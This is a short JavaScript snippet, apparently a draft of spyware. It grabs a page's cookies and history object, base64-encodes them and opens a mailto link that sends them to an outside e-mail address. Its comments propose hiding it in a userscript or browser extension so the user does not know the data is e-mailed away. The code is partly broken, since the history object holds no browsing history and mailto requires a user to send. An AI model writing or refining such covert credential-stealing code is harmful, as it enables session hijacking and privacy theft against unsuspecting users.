// get the user's cookies and browsing history 
const cookies = document.cookie; const history = window.history;

// Next, we need to create a function that will save the cookies and history to a text file
// Note: I was going to send it as an attachment at first so I converted the data to a file but was easier to just send it as the body of an e-mail
// Maybe this could be a JS Userscript or browser extension that saves history and cookies to a file, the user just doesn't know it also e-mails it to the good boys
 function saveToFile(data) { 
    const blob = new Blob([data], {type: 'text/plain'});

 const url = URL.createObjectURL(blob); 
 const a = document.createElement('a'); 

 a.href = url; 

 a.download = 'cookies_and_history.txt'; 

 document.body.appendChild(a); 

 a.click(); setTimeout(() => { 
    document.body.removeChild(a); 
    URL.revokeObjectURL(url);
},
0); 
}



// Encode file in base64 for not-really-even-script-kiddie-proofing
const reader = new FileReader();
reader.readAsDataURL(new Blob([cookies, history]));
reader.onloadend = function() {
    const base64data = reader.result.split(',')[1];

    // Send the file as the subject of an email
    const email = 'antigoth@getnada.com';
    const subject = 'Cookies and History'
    const body = base64data;
    window.location.href = `mailto:${email}?subject=${subject}&body=${body}`;
};
